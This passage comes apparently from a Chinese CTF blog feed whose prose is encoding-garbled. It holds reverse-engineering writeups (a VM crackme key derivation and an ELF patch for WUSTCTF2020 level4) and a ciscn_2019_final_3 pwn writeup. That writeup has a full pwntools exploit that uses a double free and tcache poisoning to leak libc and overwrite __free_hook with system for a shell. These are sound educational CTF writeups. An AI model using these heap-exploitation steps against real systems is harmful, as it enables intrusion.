class="line">//str[5]=53=&#x27;5&#x27;</span><br><span class="line">4,9</span><br><span class="line">8       //str[6]^=9;</span><br><span class="line">3,32</span><br><span class="line">1       //str[6]-=32;</span><br><span class="line">//(str[6]^9)-32=24</span><br><span class="line">//str[6]=49=&#x27;1&#x27;</span><br><span class="line">2,81    </span><br><span class="line">8       //str[7]+=81;</span><br><span class="line">4,36</span><br><span class="line">1       //str[7]^=36;</span><br><span class="line">//(str[7]+81)^36=-89;</span><br><span class="line">//str[7]=50=&#x27;2&#x27;</span><br><span class="line">12</span><br><span class="line">8       str[8]+=1;</span><br><span class="line">11</span><br><span class="line">1       str[8]-=1;</span><br><span class="line">str[8]=49=&#x27;1&#x27;</span><br><span class="line">5,2</span><br><span class="line">8       //str[9]*=2;</span><br><span class="line">2,37</span><br><span class="line">1       //str[9]+=37;</span><br><span class="line">//str[9]*2+37=-15</span><br><span class="line">//str[9]=102=&#x27;f&#x27;</span><br><span class="line">2,54</span><br><span class="line">8       //str[10]+=54;</span><br><span class="line">4,65</span><br><span class="line">1       //str[10]^=65;</span><br><span class="line">//(str[10]+54)^65=40</span><br><span class="line">//str[10]=51=&#x27;3&#x27;</span><br><span class="line">2,32</span><br><span class="line">8       //str[11]+=32;</span><br><span class="line">5,1</span><br><span class="line">1       //</span><br><span class="line">//str[11]+32=-124</span><br><span class="line">//str[11]=100=&#x27;d&#x27;</span><br><span class="line">5,3</span><br><span class="line">8       //str[12]*=3;</span><br><span class="line">2,37</span><br><span class="line">1       //str[12]+=37;</span><br><span class="line">//str[12]*3+37=-63</span><br><span class="line">//str[12]=52=&#x27;4&#x27;</span><br><span class="line">4,9     //str[13]^=9;</span><br><span class="line">8</span><br><span class="line">3,32    //str[13]-=32;</span><br><span class="line">1</span><br><span class="line">//(str[13]^9)-32=30;</span><br><span class="line">//str[13]=53=&#x27;7&#x27;</span><br><span class="line">2,65</span><br><span class="line">8       //str[14]+=65;</span><br><span class="line">12</span><br><span class="line">1       //str[14]++;</span><br><span class="line"></span><br><span class="line">//str[14]=56=&#x27;8&#x27;</span><br><span class="line">æ¯”è¾ƒï¼š</span><br><span class="line">7,34,7,63,7,52,7,50</span><br><span class="line">7,114,7,51,7,24</span><br><span class="line">7,-89,7,49,7,-15</span><br><span class="line">7,40,7,-124,7,-63</span><br><span class="line">7,30,7,122</span><br></pre></td></tr></table></figure><p>æœ€åå¾—å‡ºè¿™ä¸ª15ä½çš„keyå°±æ˜¯757515121f3d478 ã€‚è¿™ä¸ªç¨‹åºåŸºæœ¬ç”¨ä¸åˆ°åŠ¨æ€è°ƒè¯•ï¼Œæœ€åå°±ç®—è¦è·‘ä¹Ÿåªæ˜¯æ£€éªŒæˆ‘ä»¬çš„flagæ˜¯å¦æ­£ç¡®è€Œå·²ï¼Œé‚£ä¹ˆæˆ‘ä»¬è·‘ä¸€éå§ã€‚</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/3.png" alt="3"></p><p>æœ€ç»ˆæäº¤çš„flagå°±æ˜¯flag{757515121f3d478}</p><p>è¿™é¢˜ç›®åœ¨vmreä¸­è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œæ¨èå…¥å‘è™šæ‹Ÿæœºé€†å‘çš„å¸ˆå‚…ä¸€å®šåšåšè¿™ä¸ªï¼Œç„¶åè‡ªå·±ç²—å¿ƒå±…ç„¶æŠŠ11å’Œ12æŒ‡ä»¤æåäº†ä¸€å¼€å§‹ï¼Œå¯¼è‡´ç®—å‡ºæ¥çš„å°±ä¸€ç›´ä¸å¯¹ï¼Œè¿™ä¸ªæ¯›ç—…è¿˜æ˜¯å¾—æ”¹æ”¹(æ‚è„¸</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF2020 level4 writeup</title>
      <link href="/2021/11/02/WUSTCTF2020%20level4%20writeup/"/>
      <url>/2021/11/02/WUSTCTF2020%20level4%20writeup/</url>
      
        <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡åˆ·reäº†ï¼Œæ¥åˆ·ç‚¹reå•Šã€‚</p><span id="more"></span><p>buuctfçš„<a href="https://buuoj.cn/challenges#[WUSTCTF2020]level4">[WUSTCTF2020]level4</a></p><h2 id="é™æ€åˆ†ææ–‡ä»¶"><a href="#é™æ€åˆ†ææ–‡ä»¶" class="headerlink" title="é™æ€åˆ†ææ–‡ä»¶"></a>é™æ€åˆ†ææ–‡ä»¶</h2><p>ä¸‹è½½å‘ç°æ˜¯ä¸€ä¸ª64ä½çš„elfæ–‡ä»¶ï¼ŒIDAæ‰“å¼€åˆ†æã€‚ç…§ä¾‹å…ˆçœ‹çœ‹æ˜æ˜¾çš„å­—ç¬¦ä¸²æ˜æ–‡ï¼Œå‘ç°æœ‰leftï¼Œrightï¼Œç„¶åè¿˜æœ‰ä¸‰ç§æ‰“å°(type1,type2,type3)ã€‚è§‚å¯Ÿç¬¦å·åˆ—è¡¨å‘ç°æœ‰type1å’Œtype2å‡½æ•°ã€‚è·Ÿè¿›å»å‘ç°è·Ÿæˆ‘ä»¬äºŒå‰æ ‘çš„é€’å½’è¾“å‡ºååˆ†ç›¸ä¼¼ï¼Œå¹¶ä¸”type1 å…ˆé€’å½’äº†a1+1å†é€’å½’a1+2ï¼Œå·®ä¸å¤šä»–ä»¬å°±æ˜¯å·¦å­æ ‘å’Œå³å­æ ‘ã€‚é‚£ä¹ˆtype1å°±æ˜¯ä¸€ä¸ªåæ ¹éå†ã€‚ç„¶åtype2æ˜¯å†ä¸­é—´è¾“å‡ºçš„ï¼Œæ˜¯ä¸€ä¸ªä¸­æ ¹éå†ï¼Œé‚£ä¹ˆtype3å¤§æ¦‚ç‡å°±åº”è¯¥æ˜¯å…ˆæ ¹éå†ï¼Œè¿™é‡Œä»–æ²¡æœ‰ï¼Œé‚£ä¹ˆå…ˆæ ¹éå†å¤§æ¦‚ç‡å°±æ˜¯flagã€‚æ ¹æ®ä¸­åºéå†å’Œå…¶å®ƒä¸€ä¸ªéå†å¯ä»¥æ±‚å¦å¤–ä¸€ä¸ªéå†ï¼Œè¿™ä¸ªåœ¨æ•°æ®ç»“æ„è¯¾é‡Œæœ‰è®²ã€‚</p><h2 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h2><p>é‚£ä¹ˆå…ˆè¿è¡Œä¸€éå¯ä»¥å‘ç°å¾—åˆ°äº†ä¸¤ä¸ªç»“æœ</p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/1.png" alt="1"></p><p>æ­£è§£æ˜¾ç„¶å°±æ˜¯è€ƒä¸€ä¸ªæ•°æ®ç»“æ„å˜›ï¼Œä½†æ˜¯ä¸€ä¸ªé¢˜ç›®æ€»å¾—æœ‰å¤šç§è§£æ³•ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ä¿®æ”¹å‡½æ•°ç»“æ„ï¼Œè®©å®ƒä»ä¸€ä¸ªååºéå†å˜æˆå…ˆåºéå†ï¼Œè¿™é‡Œéœ€è¦patch elfæˆ‘ä»¬å…ˆæ‰¾åˆ°type2å‡½æ•°è§‚å¯Ÿå®ƒçš„æ±‡ç¼–ä»£ç </p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/2.png" alt="2"></p><p>å¾ˆæ˜æ˜¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jz      short loc_4007FD</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ¡æŒ‡ä»¤å¯¹åº”äº†if (*a1)çš„è·³è½¬ï¼Œé‚£ä¹ˆä¸€ç›´åˆ°æœ€åçš„call putcharä¹‹å‰åº”è¯¥éƒ½æ˜¯ifèŒƒå›´å†…çš„ä¸œè¥¿ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå‡½æ•°è°ƒç”¨è¦æŠŠä¹‹å‰çš„ä¸€åˆ‡å‡†å¤‡éƒ½ç®—è¿›æ¥ã€‚å®šä½æ‰¾åˆ°å­—èŠ‚ç ï¼Œç„¶åäº¤æ¢ä½ç½®ï¼Œå°†å¼€å¤´åˆ°ç¬¬äºŒä¸ªcall type2çš„æŒ‡ä»¤å’Œä¹‹åçš„åˆ°putcharæŒ‡ä»¤å¯¹æ¢ä½ç½®ï¼Œç„¶åpatchä¸Šå»å³å¯ã€‚</p><p>æ»¡å¿ƒæ¬¢å–œpatchä¹‹åå´å‘ç°æ²¡æœ‰å¾—åˆ°æƒ³è¦çš„ç»“æœï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>è¿™é‡Œéœ€è¦ç†è§£ä¸€ä¸‹jmpè·³è½¬æŒ‡ä»¤äº†ï¼Œcallå’Œjmpä¸¤ä¸ªæŒ‡ä»¤å®é™…ä¸Šéƒ½å±äºæ— æ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼Œä¸ºä»€ä¹ˆåŠ ä»¥åŒºåˆ†å‘¢ï¼Œcallå®ƒåœ¨è·³è½¬ä¹‹åä¸€å®šä¼šæœ‰ä¸€ä¸ªè¿”å›çš„åŠ¨ä½œï¼Œè€Œjmpåˆ™ä¸éœ€è¦ã€‚å¦‚æœè‡ªå·±å»å°è¯•ç¼–ç çš„è¯å°±ä¼šå‘ç°å®ƒçš„ç¼–ç å¼€å¤´éƒ½æ˜¯E8 +4ä¸ªå­—èŠ‚å®šä½ä»£ç ä½ç½®ã€‚ç„¶åå®ƒæ˜¯æ€ä¹ˆå®šä½çš„å‘¢ï¼Ÿé¦–å…ˆE8å¼€å§‹ï¼Œä¹‹åå››ä¸ªå­—èŠ‚ä¸ºå°ç«¯è¡¨ç¤ºè¿™æ¡æŒ‡ä»¤(jmp xxx)çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„ä½ç½®åˆ° ç›®æ ‡ä»£ç åœ°å€ä½ç½®çš„å·®å€¼(åè€…å‡å‰è€…)ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚æˆ‘æœ‰å¦‚ä¸‹çš„æœºå™¨ä»£ç ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nop  90//1</span><br><span class="line">nop  90//2</span><br><span class="line">nop  90//3</span><br><span class="line">nop  90//4</span><br><span class="line">jmp xxx E8 ?? ?? ?? ??//5</span><br><span class="line">nop  90//6</span><br><span class="line">nop  90//7</span><br><span class="line">nop  90//8</span><br></pre></td></tr></table></figure><p>å½“ç¼–ç çš„4ä¸ªå­—èŠ‚éƒ½ä¸º00æ—¶ï¼Œé‚£ä¹ˆè¿™æ¡jmpæŒ‡ä»¤çš„è·³è½¬ä½ç½®å°±æ˜¯ç¬¬å…­æ¡æŒ‡ä»¤ã€‚</p><p>å¦‚æœä¸º01 00 00 00æ—¶ï¼Œé‚£ä¹ˆè¿™æ¡æŒ‡ä»¤è·³è½¬çš„ä½ç½®æ˜¯ç¬¬ä¸ƒæ¡æŒ‡ä»¤ã€‚</p><p>å¦‚æœä¸º02 00 00 00æ—¶ï¼Œé‚£ä¹ˆè¿™æ¡æŒ‡ä»¤è·³è½¬çš„ä½ç½®æ˜¯ç¬¬8æ¡æŒ‡ä»¤ã€‚</p><p>ä»¥æ­¤ç±»æ¨ï¼Œæ³¨æ„é‡Œé¢çš„æ•°å€¼è¡¨ç¤ºå­—èŠ‚ï¼Œè€Œä¸æ˜¯æŒ‡ä»¤çš„æ•°ç›®ï¼Œå¦‚æœæƒ³å¾€å›æŒ‘ï¼Œé‚£ä¹ˆåˆ™éœ€è¦ç”¨ç›¸åº”è´Ÿæ•°çš„è¡¥ç è¡¨ç¤ºåç§»ã€‚</p><p>è®²å®Œè¿™äº›ä¹‹åå°±èƒ½ç†è§£ä¸ºä»€ä¹ˆç®€å•çš„äº¤æ¢ä»£ç ä½ç½®ä¼šå¯¼è‡´patchå¤±è´¥äº†ï¼Œå› ä¸ºæŒ‡ä»¤çš„åœ°å€æ”¹å˜äº†ï¼Œæ‰€ä»¥åŸæ¥è¿™ä¹ˆå¤šåç§»é‡å®ƒå·²ç»å¯¹åº”ä¸ä¸Šç›¸åº”çš„å‡½æ•°äº†ã€‚å› æ­¤éœ€è¦è‡ªå·±æ‰‹åŠ¨æ“ä½œä¸€ä¸‹ï¼Œè°ƒæ•´callæŒ‡ä»¤çš„åç§»ä½¿ä¹‹æˆåŠŸpatchï¼Œè¿™é‡Œå»ºè®®ä½¿ç”¨keypatchæ’ä»¶ï¼Œåœ¨æ›´æ”¹è¿™æ¡æŒ‡ä»¤åªéœ€ç›´æ¥è¾“å…¥call åœ°å€ï¼Œåˆ™å¯ä»¥å¿«é€Ÿå®Œæˆpatchï¼Œä¸ç”¨è‡ªå·±ç®—åç§»ç¼–ç ã€‚</p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/3.png" alt="3"></p><p>å¯ä»¥çœ‹åˆ°ä»£ç é€»è¾‘æŒ‰ç…§æˆ‘ä»¬é¢„æœŸçš„æ–¹å‘æ›´æ”¹äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬è·‘ä¸€ä¸‹ï¼Œç›´æ¥è¾“å‡ºflagã€‚</p><p><img src="/2021/11/02/WUSTCTF2020%20level4%20writeup/4.png" alt="4"></p><p>flag: wctf2020{This_IS_A_7reE}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2019_final_3 writeup</title>
      <link href="/2021/11/01/ciscn2019_final_3%20writeup/"/>
      <url>/2021/11/01/ciscn2019_final_3%20writeup/</url>
      
        <content type="html"><![CDATA[<p>buuåˆ·é¢˜è®°å½•ï¼š<a href="https://buuoj.cn/challenges#ciscn_2019_final_3">ciscn_final_3</a></p><span id="more"></span><h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>ä»Šå¤©è§£å†³äº†C++æ–‡ä»¶æ¢ç‰ˆæœ¬çš„é—®é¢˜ï¼Œä¹Ÿæ˜¯ä¸€åˆ»æ²¡è€½è¯¯ç›´æ¥åšäº†è¿™é“C++é¢˜ç›®ï¼Œä¸å¾—ä¸è¯´å¤ªçˆ½äº†å•Šï¼Œå†ä¹Ÿä¸ç”¨å› ä¸ºé¢˜ç›®æ˜¯C++å†™çš„å°±åšä¸äº†äº†ï¼Œè¯ä¸å¤šè¯´æ¥çœ‹æ–‡ä»¶ã€‚</p><h2 id="é™æ€åˆ†æelfæ–‡ä»¶"><a href="#é™æ€åˆ†æelfæ–‡ä»¶" class="headerlink" title="é™æ€åˆ†æelfæ–‡ä»¶"></a>é™æ€åˆ†æelfæ–‡ä»¶</h2><p>é¢˜ç›®å‘ŠçŸ¥æ˜¯ubuntu18ç‰ˆæœ¬çš„ï¼Œç»™äº†libc.so.6æ–‡ä»¶ï¼Œä½†æ˜¯ç›²çŒœè·Ÿå®ƒè‡ªå·±çš„ä¸€æ ·ï¼Œé‚£å°±å…ˆæ¢å¥½elfæ–‡ä»¶çš„ç‰ˆæœ¬ã€‚checksecè§‚å¯Ÿä¿æŠ¤å…¨å¼€ã€‚ç„¶åIDAæ‰“å¼€ä¸€çœ‹ï¼Œå‘ç°æ˜¯ç»å…¸çš„å †èœå•é¢˜ï¼Œæä¾›äº†ä¸¤ç§æ“ä½œï¼Œaddå’Œdeleteã€‚deleteå¾ˆæ˜æ˜¾freeä¹‹åæŒ‡é’ˆæ²¡æœ‰æ¸…é›¶ï¼Œå­˜åœ¨UAFæ¼æ´ï¼Œå¹¶ä¸”addåªå…è®¸ä¸‹æ ‡å¼€åˆ°0x18ï¼Œä¹Ÿå°±æ˜¯0~24æ€»å…±èƒ½add 25æ¬¡ã€‚ç„¶åå¤§å°é™åˆ¶åœ¨äº†fastbinå¤§å°çš„èŒƒå›´å†…ï¼Œä½†æ˜¯å¾ˆè´´å¿ƒåœ°ï¼Œæ¯æ¬¡addä¹‹åç»™äº†mallocä¹‹åçš„åœ°å€ã€‚é‚£ä¹ˆå¤§æ¦‚ç‡é€šè¿‡è¿™é‡Œæ³„éœ²ï¼ˆps:ä¸€å¼€å§‹å¹¶æ²¡æœ‰æƒ³åˆ°ï¼Œè¿˜æƒ³ç€ç”¨IOæ³„éœ²æ¥ç€çš„ï¼‰ï¼Œæ€è·¯å¤§æ¦‚æ˜¯å…ˆé€šè¿‡ä¸€æ¬¡double freeä¿®æ”¹ä¸€ä¸ªchunkçš„sizeä¸ºå…¶å®ƒå¤§å°ï¼Œç„¶åfreeä¸€æ¬¡ï¼Œå†ä¿®æ”¹æˆéfastbinèŒƒå›´çš„å †å—ï¼Œå¹¶ä¸”é˜²æ­¢å †å—æ”¾å…¥unsortedbinè¢«check failï¼Œæœ€å¥½ä¸è¦æ„é€ å †ç›¸äº’é‡å (è¿™å¥è¯çš„æ„æ€å·®ä¸å¤šå°±æ˜¯å°½é‡è®©å°å †å—å®Œå…¨è¢«å¤§å †å—åŒ…å«ï¼Œå› ä¸ºå®ƒä¼šæ£€æµ‹next chunkçš„)ã€‚ç„¶åå‡ºæ¥äº†libcçš„åœ°å€ä¹‹åå‡†å¤‡å¥½ä¹‹å‰è¢«freeçš„å †å—ï¼Œaddæ·»åŠ ä¹‹ålibcåœ°å€è½å…¥tcacheä¸­ï¼Œå†æ¬¡addæ³„éœ²è¿™ä¸ªåœ°å€ï¼Œç„¶åå°±å¾ˆç®€å•äº†ï¼Œdouble freeåŠ«æŒfree_hookä¸ºsystemå‡½æ•°ï¼Œå†freeä¸€ä¸ªå¸¦æœ‰/bin/shå­—ç¬¦ä¸²çš„å †å—å³å¯getshellã€‚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.27-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;something&#x27;</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> index==<span class="number">11</span>:<span class="keyword">return</span> </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    <span class="comment">#if index==11:gdb.attach(p)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./ciscn_final_3&#x27;</span>,<span class="number">28019</span>)</span><br><span class="line">heap_addr=add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">success(<span class="string">&#x27;heap_addr:&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#double freeä¿å­˜ä¸€ä¸ªfreeçš„0x30å †å—åœ¨0å·å †å—ä½ç½®</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,p64(heap_addr-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x31</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>,p64(heap_addr-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>))<span class="comment">#æ„é€ éfastbinå¤§å°çš„å †å—</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x38</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):<span class="comment">#å¡«æ»¡tcache ä½¿å…¶è½å…¥unsorted bin</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">libc_addr=add(<span class="number">10</span>,<span class="number">0x28</span>,<span class="string">b&#x27;\0&#x27;</span>)-<span class="number">0x3ebca0</span><span class="comment">#æ³„éœ²libcåœ°å€</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x60</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))<span class="comment">#åŠ«æŒfreehook</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x60</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">15</span>)<span class="comment">#getshell</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºC++æ–‡ä»¶æ¢libcç‰ˆæœ¬çš„é—®é¢˜</title>
      <link href="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©è§£å†³äº†ä¸€ä»¶å›°æ‰°äº†æˆ‘å¾ˆä¹…çš„äº‹æƒ…ï¼Œé‚£å°±æ˜¯å¯¹äºelfæ–‡ä»¶çš„patchã€‚ä»¥å‰æˆ‘åœ¨åšpwné¢˜çš„æ—¶å€™ï¼Œé‡åˆ°C++æ–‡ä»¶æ€»æ˜¯æŸæ‰‹æ— ç­–ã€‚</p><span id="more"></span><p>åœ¨æ¢è¿‡å¯¹åº”çš„ç‰ˆæœ¬ä¹‹åï¼Œlibcæ€»æ˜¯æŠ¥é”™ã€‚å°±å¦‚ä¸‹é¢è¿™å¼ å›¾ç‰‡</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/1.png" alt="1"></p><p>åœ¨æ­¤é—®äº†è‚¥çŒ«å¸ˆå‚…ç»™æˆ‘çš„è§£å†³åŠæ³•ï¼Œè§£å†³åŠæ³•å¾ˆæ—©å°±ç»™äº†æˆ‘çš„ï¼Œä½†æ˜¯æˆ‘åˆ°ç°åœ¨æ‰ææ˜ç™½ï¼Œå¼„æ‡‚,ä¸‹é¢æ˜¯è‚¥çŒ«å¸ˆå‚…çš„åŸè¯ã€‚</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/2.png" alt="2"></p><p>åœ¨æ­¤ä¹‹å‰æˆ‘ä¸€ç›´éƒ½æ˜¯ç”¨patchelfå°è£…çš„è„šæœ¬åŠ ä¸Šglibc all in oneé…åˆå®Œç¾æ¢libcç‰ˆæœ¬ï¼Œå¯¹äºCç¨‹åºæ˜¯æ²¡æœ‰ä»»ä½•é—®é¢˜çš„ã€‚ä½†æ˜¯C++å‡ºç°äº†é—®é¢˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å…ˆçœ‹çœ‹Cå’ŒC++ç¼–è¯‘é“¾æ¥ä¹‹åå‡ºæ¥çš„æ–‡ä»¶çš„ä¾èµ–åº“çš„ç»“æ„ã€‚</p><p>é‚£ä¹ˆä¸ºäº†æµ‹è¯•å°±å…ˆå†™å‡ºä¸¤ä¸ªç‰ˆæœ¬çš„hello worldç¨‹åºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//C</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 